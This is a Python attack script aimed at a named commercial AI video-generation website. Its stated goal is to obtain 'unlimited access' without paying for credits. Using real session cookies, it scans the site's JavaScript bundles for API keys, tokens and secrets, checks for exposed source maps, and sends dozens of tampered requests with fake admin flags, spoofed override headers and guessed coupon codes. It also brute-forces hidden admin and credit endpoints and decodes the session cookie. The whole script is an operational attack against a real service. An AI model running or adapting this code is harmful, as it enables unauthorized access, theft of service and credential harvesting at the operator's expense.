"""
_dig_viddo.py — Full backend attack surface for viddo.ai unlimited access
Multi-angle attack:
 1. Pull ALL Next.js JS chunks → scan for secrets / internal endpoints / bypass flags
 2. Check .map source files (full server code leak)
 3. Probe middle-layer with every conceivable bypass param
 4. Hidden admin/promo/referral endpoint brute
 5. Decode session_data → look for plan/credits
 6. Probe /_next/data/ RSC endpoints for server-side state
"""
import requests, json, re, time, base64, urllib.parse
from viddo_unlimited import COOKIES, HEADERS, BASE

S = requests.Session()
S.cookies.update(COOKIES)
S.headers.update(HEADERS)

def get(path, **kw):
    return S.get(BASE + path, timeout=kw.pop('timeout', 12), **kw)
def post(path, **kw):
    return S.post(BASE + path, timeout=kw.pop('timeout', 12), **kw)

# ─────────────────────────────────────────────────────────────────────────────
# 1. PULL BUILD ID + ALL JS CHUNKS
# ─────────────────────────────────────────────────────────────────────────────
print('='*60)
print('[1] NEXT.JS BUNDLE SCAN')
print('='*60)

r = get('/')
# Extract build ID
bid = None
for pat in [r'"buildId"\s*:\s*"([^"]+)"',
            r'/_next/static/([a-zA-Z0-9_-]+)/_buildManifest',
            r'/_next/static/([^/]{8,})/_ssgManifest']:
    m = re.search(pat, r.text)
    if m:
        bid = m.group(1)
        break
print(f'Build ID: {bid}')

# All script src on homepage
script_paths = list(set(re.findall(r'src="(/_next/static/[^"]+\.js)"', r.text)))
print(f'Script tags: {len(script_paths)}')

# Pull build manifest for more chunks
if bid:
    bm = get(f'/_next/static/{bid}/_buildManifest.js')
    extra = list(set(re.findall(r'"(/_next/static/[^"]+\.js)"', bm.text)))
    script_paths += extra
    print(f'Total chunks incl. manifest: {len(set(script_paths))}')

script_paths = list(set(script_paths))

# Patterns to hunt
HUNT = [
    # Credentials / keys
    (r'NEXT_PUBLIC_[A-Z_]+\s*[:=]\s*["\']([^"\']{6,})["\']', 'NEXT_PUBLIC'),
    (r'(?:api[-_]?key|apikey|API_KEY)\s*[:=]\s*["\']([A-Za-z0-9_\-]{16,})["\']', 'API_KEY'),
    (r'(?:secret|SECRET)\s*[:=]\s*["\']([A-Za-z0-9_\-]{16,})["\']', 'SECRET'),
    (r'Bearer\s+([A-Za-z0-9_\-\.]{30,})', 'BEARER'),
    (r'eyJ[A-Za-z0-9_\-]{20,}\.eyJ[A-Za-z0-9_\-]{20,}', 'JWT'),
    (r'sk-[A-Za-z0-9]{20,}', 'OPENAI_SK'),
    (r'AIza[A-Za-z0-9_\-]{35}', 'GOOGLE_KEY'),
    # Credit/bypass logic
    (r'(?:freeMode|skipCredit|bypassCredit|useCredit|noCredit|freeTier)["\s]*[:=]["\s]*[^,;\n]{0,60}', 'CREDIT_FLAG'),
    (r'(?:coupon|promo|voucher|referral)["\s]*[:=]\s*["\']([^"\']{3,})["\']', 'PROMO_CODE'),
    (r'(?:credit|quota|limit)\s*[<>=!]+\s*\d+', 'CREDIT_CHECK'),
    (r'if\s*\([^)]*credit[^)]*\)', 'CREDIT_GATE'),
    # Internal routes
    (r'["\']/(api/(?:admin|internal|debug|dev|test)[^"\']{0,60})["\']', 'INTERNAL_ROUTE'),
    (r'["\']/(api/[a-z0-9\-_/]{3,50})["\']', 'API_ROUTE'),
    # Env vars that might be in bundle
    (r'process\.env\.([A-Z_]{5,})', 'ENV_VAR'),
    # External AI provider URLs (to potentially call directly)
    (r'https://[^\s"\'<>]*(?:kling|runway|sora|veo|wan|seedance|hailuo)[^\s"\'<>]{0,100}', 'AI_PROVIDER_URL'),
    (r'https://api\.[a-z]+\.(?:ai|com)/[^\s"\'<>]{0,80}', 'AI_API_URL'),
]

all_hits = {}
api_routes = set()

print('Scanning chunks...')
for sp in script_paths:
    try:
        rc = S.get(BASE + sp, timeout=8)
        if rc.status_code != 200:
            continue
        txt = rc.text
        fname = sp.split('/')[-1]
        for pat, label in HUNT:
            for m in re.finditer(pat, txt, re.IGNORECASE):
                val = m.group(0)[:200]
                if label == 'API_ROUTE':
                    api_routes.add(m.group(1))
                else:
                    all_hits.setdefault(label, []).append((fname, val))
    except:
        pass

# Print non-route hits (deduped)
for label, hits in all_hits.items():
    if label == 'API_ROUTE':
        continue
    seen = set()
    print(f'\n  [{label}]')
    for fname, val in hits:
        if val not in seen:
            seen.add(val)
            print(f'    {fname}: {val[:200]}')

print(f'\n  [API_ROUTES from bundle] ({len(api_routes)} unique):')
for r2 in sorted(api_routes)[:80]:
    print(f'    /{ r2}')


# ─────────────────────────────────────────────────────────────────────────────
# 2. SOURCE MAP LEAK CHECK
# ─────────────────────────────────────────────────────────────────────────────
print('\n' + '='*60)
print('[2] SOURCE MAP (.map) LEAK CHECK')
print('='*60)

map_hits = []
for sp in script_paths[:20]:
    url = BASE + sp + '.map'
    try:
        rm = S.get(url, timeout=8)
        if rm.status_code == 200 and 'sourcesContent' in rm.text:
            print(f'  [MAP LEAK] {sp}.map — {len(rm.text)} bytes')
            map_hits.append((sp, rm.text[:5000]))
    except:
        pass

if not map_hits:
    print('  No .map files exposed')
else:
    for sp, content in map_hits[:2]:
        print(f'\n  === {sp}.map (first 3000 chars):')
        # Extract actual source code from sourcesContent
        sc = re.findall(r'"sourcesContent"\s*:\s*\[([^\]]{0,5000})', content)
        if sc:
            print(sc[0][:3000])


# ─────────────────────────────────────────────────────────────────────────────
# 3. MIDDLE-LAYER BYPASS PARAM PROBE
# ─────────────────────────────────────────────────────────────────────────────
print('\n' + '='*60)
print('[3] MIDDLE-LAYER BYPASS PROBES')
print('='*60)

BASE_BODY = {
    'model': 'seedance-2-0',
    'channel': 'version2',
    'prompt': 'x',
    'aspectRatio': '16:9',
    'quality': '480p',
    'duration': 5,
    'webSearch': False,
    '': [],
}

PROBES = [
    ('freeMode=true',           {'freeMode': True}),
    ('skipCredits=true',        {'skipCredits': True}),
    ('useCredits=false',        {'useCredits': False}),
    ('credits=0',               {'credits': 0}),
    ('creditCost=0',            {'creditCost': 0}),
    ('channel=free',            {'channel': 'free'}),
    ('channel=admin',           {'channel': 'admin'}),
    ('channel=internal',        {'channel': 'internal'}),
    ('channel=demo',            {'channel': 'demo'}),
    ('channel=trial',           {'channel': 'trial'}),
    ('channel=version1',        {'channel': 'version1'}),
    ('channel=version3',        {'channel': 'version3'}),
    ('plan=unlimited',          {'plan': 'unlimited'}),
    ('adminOverride=true',      {'adminOverride': True}),
    ('isAdmin=true',            {'isAdmin': True}),
    ('debug=true',              {'debug': True}),
    ('test=true',               {'test': True}),
    ('coupon=UNLIMITED',        {'coupon': 'UNLIMITED'}),
    ('coupon=FREE',             {'coupon': 'FREE'}),
    ('coupon=VIDDO',            {'coupon': 'VIDDO'}),
    ('promo=FREE',              {'promo': 'FREE'}),
    ('referralCode=FREE',       {'referralCode': 'FREE'}),
    ('x-admin-override header', {}),  # handled below
]

for label, extra in PROBES:
    body = {**BASE_BODY, **extra}
    hdrs = {}
    if label == 'x-admin-override header':
        hdrs = {'X-Admin-Override': 'true', 'X-Internal': 'true', 'X-Debug': 'true'}
    try:
        r3 = S.post(BASE + '/api/middle-layer', json=body, headers=hdrs, timeout=10)
        d = r3.json()
        if d.get('taskId'):
            print(f'  [JOB ACCEPTED] {label} → {d}')
        else:
            msg = str(d)[:120]
            flag = 'CREDIT' if 'credit' in msg.lower() else ''
            print(f'  {flag or "   "} [{r3.status_code}] {label} → {msg}')
    except Exception as e:
        print(f'  [EXC] {label} → {e}')
    time.sleep(0.3)


# ─────────────────────────────────────────────────────────────────────────────
# 4. HIDDEN ENDPOINT BRUTE
# ─────────────────────────────────────────────────────────────────────────────
print('\n' + '='*60)
print('[4] HIDDEN ENDPOINT BRUTE')
print('='*60)

BRUTE_EPS = [
    '/api/admin/credits', '/api/admin/user', '/api/admin/generate',
    '/api/internal/credits', '/api/internal/generate', '/api/internal/user',
    '/api/promo', '/api/promo/apply', '/api/promo/redeem',
    '/api/coupon', '/api/coupon/apply', '/api/coupon/redeem',
    '/api/referral', '/api/referral/apply',
    '/api/affiliate', '/api/free-trial', '/api/trial',
    '/api/gift', '/api/redeem', '/api/voucher',
    '/api/topup', '/api/add-credits', '/api/credits/add',
    '/api/credits/reset', '/api/credits/grant', '/api/credits/topup',
    '/api/user/topup', '/api/user/plan', '/api/user/subscription',
    '/api/debug', '/api/debug/generate', '/api/test', '/api/test/generate',
    '/api/dev', '/api/bypass', '/api/unlimited', '/api/override',
    '/api/webhook/credits', '/api/webhook/stripe',
    '/api/stripe/webhook', '/api/billing/webhook',
    '/_internal', '/_internal/credits', '/_internal/generate',
    '/api/invite', '/api/invite/redeem',
    '/api/credits/purchase', '/api/purchase',
    '/api/plan/upgrade', '/api/plan/downgrade',
    '/api/user/upgrade',
    '/api/generation/free', '/api/generate/free',
    '/api/middle-layer/free', '/api/middle-layer/admin',
    '/api/middle-layer/bypass',
]

# Also add discovered routes from bundle
for rt in api_routes:
    ep = '/' + rt if not rt.startswith('/') else rt
    if ep not in BRUTE_EPS:
        BRUTE_EPS.append(ep)

interesting = []
for ep in BRUTE_EPS:
    try:
        rg = S.get(BASE + ep, timeout=5)
        rp = S.post(BASE + ep, json={}, timeout=5)
        for method, resp in [('GET', rg), ('POST', rp)]:
            sc = resp.status_code
            ct = resp.headers.get('content-type', '')
            body_snip = resp.text[:200]
            is_html = 'text/html' in ct
            if sc == 404 and is_html:
                continue
            if sc in (200, 201, 400, 401, 403, 422, 500) and not is_html:
                print(f'  [{sc}] {method} {ep}: {body_snip}')
                interesting.append((ep, method, sc, body_snip))
            elif sc == 403:
                print(f'  [403-interesting] {method} {ep}: {body_snip[:80]}')
    except:
        pass

print(f'\n  Total interesting: {len(interesting)}')


# ─────────────────────────────────────────────────────────────────────────────
# 5. SESSION DATA DECODE
# ─────────────────────────────────────────────────────────────────────────────
print('\n' + '='*60)
print('[5] SESSION DATA DECODE')
print('='*60)

raw = COOKIES['__Secure-better-auth.session_data']
try:
    padded = raw + '=' * (-len(raw) % 4)
    decoded = json.loads(base64.b64decode(padded).decode('utf-8'))
    print(json.dumps(decoded, indent=2)[:3000])
    # Look for plan/credit fields
    flat = json.dumps(decoded).lower()
    for kw in ['credit', 'plan', 'subscription', 'quota', 'limit', 'role', 'admin']:
        if kw in flat:
            print(f'\n  FOUND "{kw}" in session data!')
except Exception as e:
    print(f'Decode failed: {e}')
    # Try without padding
    try:
        decoded2 = base64.urlsafe_b64decode(raw + '==').decode('utf-8')
        print('urlsafe b64:', decoded2[:500])
    except:
        pass


# ─────────────────────────────────────────────────────────────────────────────
# 6. RSC / NEXT DATA ENDPOINTS
# ─────────────────────────────────────────────────────────────────────────────
print('\n' + '='*60)
print('[6] NEXT.JS RSC / _next/data PROBE')
print('='*60)

rsc_pages = ['/', '/dashboard', '/generate', '/account', '/billing', '/settings', '/pricing']
for page in rsc_pages:
    # RSC format
    rsc_url = BASE + page
    r_rsc = S.get(rsc_url, headers={**HEADERS, 'RSC': '1', 'Next-Router-State-Tree': '%5B%22%22%2C%7B%7D%5D'}, timeout=10)
    if r_rsc.status_code == 200 and 'text/html' not in r_rsc.headers.get('content-type', ''):
        body = r_rsc.text[:1000]
        if any(k in body.lower() for k in ['credit', 'plan', 'subscription', 'balance']):
            print(f'\n  RSC {page} → credit-relevant data:')
            print(f'  {body[:500]}')
        else:
            print(f'  RSC {page} → {r_rsc.status_code} {len(r_rsc.text)}b')

    # _next/data (Pages Router style, might still work for some routes)
    if bid:
        nd_url = BASE + f'/_next/data/{bid}{page}.json'
        if page == '/':
            nd_url = BASE + f'/_next/data/{bid}/index.json'
        r_nd = S.get(nd_url, timeout=8)
        if r_nd.status_code == 200:
            print(f'\n  _next/data {page}: {r_nd.text[:500]}')

print('\n=== DONE ===')

